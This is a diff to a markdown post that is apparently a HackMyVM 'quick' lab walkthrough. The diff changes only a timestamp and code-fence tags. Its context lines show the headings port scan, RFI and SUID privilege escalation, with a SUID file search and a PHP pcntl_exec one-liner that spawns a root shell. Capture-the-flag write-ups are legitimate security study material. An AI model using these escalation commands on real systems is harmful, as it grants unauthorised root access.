@@ -3,7 +3,7 @@ title: quick
 tags:
   - sec/hackmyvm
 date: 2024-02-10T22:09:01
-lastmod: 2024-11-24T18:47:22
+lastmod: 2024-11-24T19:10:39
 toc: "true"
 draft: "false"
 ---
@@ -12,7 +12,7 @@ draft: "false"
 ![HMM_quick_image_1](https://img.l1uyun.one/HMM_quick_image_1.png)
 前后对比
 ![HMM_quick_image_2](https://img.l1uyun.one/HMM_quick_image_2.png)
-```
+```bash
 192.168.10.12
 ```
 ## port scan
@@ -34,7 +34,7 @@ RFI
 ## use SUID file to get root
  `find / -type f -perm -u=s 2>/dev/null`
 发现一个suid的 php
-```
+```bash
 ./usr/bin/php7.0 -r "pcntl_exec('/bin/sh', ['-p']);"
 ```
 ## root. txt PWD
